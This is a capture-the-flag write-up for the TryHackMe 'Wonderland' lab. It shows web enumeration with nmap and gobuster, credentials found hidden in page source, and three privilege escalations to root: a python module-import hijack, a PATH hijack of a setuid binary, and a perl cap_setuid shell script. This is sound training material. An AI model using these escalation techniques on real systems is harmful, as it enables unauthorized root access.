# Try Hack Me - Wonderland
**February 12th, 2021**

Wonderland is the only room where you want to go down a rabbit hole! Enumerating the web server gives up secret credentials, which will give you a foot hold to the box. From there, abusing a series of misconfigurations will let you traverse multiple users until you get root access.

## Quick Summary
* Enumerate a deep, but predictable, web tree to get credentials
* Abusing python import order to get a second user on a custom python script with sudo privileges
* Abusing PATH order to have a setuid binary run a custom script to get a third user
* Abusing a setuid capability on perl to get root access


### Tools required
* gobuster with a simple password list

## Detailed steps
### Port scan
Scanning the ports reveals a web server running on ```PORT```, and an sshd waiting for connection
```bash
$ nmap -sC -sV -oA nmap/init 10.10.167.35
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-12 23:56 CEST
Nmap scan report for 10.10.167.35
Host is up (0.046s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The title ```Follow the white rabbit.``` is worthy of noting.

### Directory Traversal
I ran gobuster on the server to see if it has anything interesting
```bash
$ gobuster dir -w /usr/share/wordlists/dirb/directory-list-2.3-medium.txt -u http://10.10.188.189 -t 10
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.188.189/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================

===============================================================
/img (Status: 301)
/r (Status: 301)
/poem (Status: 301)
^C
```

The directory **/r** seemed suspicious, so I ran gobuster again, this time from the **/r** directory
```bash
$ gobuster dir -w /usr/share/wordlists/dirb/directory-list-2.3-medium.txt -u http://10.10.188.189/r -t 10
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.188.189/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================

===============================================================
/a (Status: 301)
^C
```

At this point I realized we we're going down a (literal) rabbit hole. So I followed it to find a final cryptic page. Reading the source of the page had credentials stuffed in a hidden element.
```html
<!DOCTYPE html>

<head>
    <title>Enter wonderland</title>
    <link rel="stylesheet" type="text/css" href="/main.css">
</head>

<body>
    <h1>Open the door and enter wonderland</h1>
    <p>"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."</p>
    <p>Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"
    </p>
    <p>"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving
        the other paw, "lives a March Hare. Visit either you like: they’re both mad."</p>
    <p style="display: none;">alice:__REDACTED__</p>
    <img src="/img/alice_door.png" style="height: 50rem;">
</body>
```

These credentials worked for SSH access

#### Getting the user flag
This box is a little upside down! Once you're in as ```alice``` you see the root flag, instead of the user flag
```bash
alice@wonderland:~$ ls -al
total 40
drwxr-xr-x 5 alice alice 4096 May 25  2020 .
drwxr-xr-x 6 root  root  4096 May 25  2020 ..
lrwxrwxrwx 1 root  root     9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25  2020 .bash_logout
-rw-r--r-- 1 alice alice 3771 May 25  2020 .bashrc
drwx------ 2 alice alice 4096 May 25  2020 .cache
drwx------ 3 alice alice 4096 May 25  2020 .gnupg
drwxrwxr-x 3 alice alice 4096 May 25  2020 .local
-rw-r--r-- 1 alice alice  807 May 25  2020 .profile
-rw------- 1 root  root    66 May 25  2020 root.txt
-rw-r--r-- 1 root  root  3577 May 25  2020 walrus_and_the_carpenter.py
```

If you view the hint for this flag it says ```Everything is upside down here.```. Maybe the user flag is in the root location?
```bash
alice@wonderland:~$ ls -al /root
ls: cannot open directory '/root': Permission denied
alice@wonderland:~$ ls -al /root/user.txt
-rw-r--r-- 1 root root 32 May 25  2020 /root/user.txt
```

Although we can't access the root folder, the normal ```user.txt``` format is directly accessible by filename within there.

### Abusing python import order
First, let's check for sudo access:
```bash
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

It seems we can run an interesting python script as the ```rabbit``` user. Unfortunately from above, we don't have write permissions to it. Which means we can't change it. The sudo command also has the hardcoded path to python, so we can't abuse creating a custom script named ```python``` somewhere else in PATH.

Here's what's in the script
```python
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.

...

"O Oysters," said the Carpenter.
"You’ve had a pleasant run!
Shall we be trotting home again?"
But answer came there none —
And that was scarcely odd, because
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```

Python has a special path as well to find modules to import. Since this script imports random, I created a custom ```random.py``` in the same folder with a customer ```choice``` function that launches a shell. Here's the resulting script:
```python
import os
def choice(*args):
    os.system("/bin/bash")
```

now running the command exactly as sudo says to, we can get a shell as ```rabbit```
```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
[sudo] password for alice: 
rabbit@wonderland:~$ 
```

### Abusing PATH order
Going into ```rabbit```'s' home folder, you see a setuid binary.
```bash
rabbit@wonderland:~$ cd ../rabbit/
rabbit@wonderland:/home/rabbit$ ls -al
total 40
drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 .
drwxr-xr-x 6 root   root    4096 May 25  2020 ..
lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
```

Launching this binary shows a cryptic message, and a request to wait for an hour from now. Typing anything in appears to give a segmentation fault
```bash
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Tue, 02 Mar 2021 17:49:50 +0000
Ask very nicely, and I will give you some tea while you wait for him
asdf
Segmentation fault (core dumped)

rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Tue, 02 Mar 2021 17:49:56 +0000
Ask very nicely, and I will give you some tea while you wait for him

Segmentation fault (core dumped)
```

I ran strings on this program by pulling it off their machine onto mine, but that's not a necessary step. The format of the date that's given looks rather like the output of the date command. It's very likely that the program is exec-ing the date program in the background to get this value. What if we create a bash script for date, and put it in our path before where the date program is located?
```bash
echo "#!/bin/bash" > /home/rabbit/date
echo "/bin/bash -i" >> /home/rabbit/date
chmod +x /home/rabbit/date
PATH=/home/rabbit:$PATH
/home/rabbit/teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$
hatter@wonderland:/home/rabbit$
```

Now we are the hatter user.

### Abusing capabilities
First off, you're going to see a password file. Unfortuntly, this isn't a way forward but a check point. To clean our environment, su to the hatter user
```bash
hatter@wonderland:/home/rabbit$ cd ../hatter
hatter@wonderland:/home/hatter$ ls -al
total 28
drwxr-x--- 3 hatter hatter 4096 May 25  2020 .
drwxr-xr-x 6 root   root   4096 May 25  2020 ..
lrwxrwxrwx 1 root   root      9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 hatter hatter  220 May 25  2020 .bash_logout
-rw-r--r-- 1 hatter hatter 3771 May 25  2020 .bashrc
drwxrwxr-x 3 hatter hatter 4096 May 25  2020 .local
-rw-r--r-- 1 hatter hatter  807 May 25  2020 .profile
-rw------- 1 hatter hatter   29 May 25  2020 password.txt
hatter@wonderland:/home/hatter$ cat password.txt 
__REDACTED__

hatter@wonderland:/home/hatter$ groups
rabbit
hatter@wonderland:/home/hatter$ su hatter
Password:
hatter@wonderland:~$ groups
hatter
```


Instead what I did, was ran ```linpeas.sh``` which parses a linux system for possible escalation entry points. Doing this reveals that perl is owned by the hatter group, and has setuid capabilites. Capabilities are like a fine grain permission in linux. Instead of the binary having wide open setuid set, it's only set for the hatter user in this instance.
```bash
hatter@wonderland:/home/hatter$ ls -al /usr/bin/perl
-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl
hatter@wonderland:/home/hatter$ getcap /usr/bin/perl
/usr/bin/perl = cap_setuid+ep
```

With this, we can launch perl, setuid to the root user, and run a shell. Let's create a script called ```evil.pl```
```perl
#!/usr/bin/perl
use POSIX setuid;
setuid(0);
exec('/bin/bash');
```

```bash
hatter@wonderland:~$ /usr/bin/perl ./evil.pl
root@wonderland:~# 
```

Read the ```root.txt``` flag from ```/home/alice``` (Remember, it's backwards!) and the box is complete.
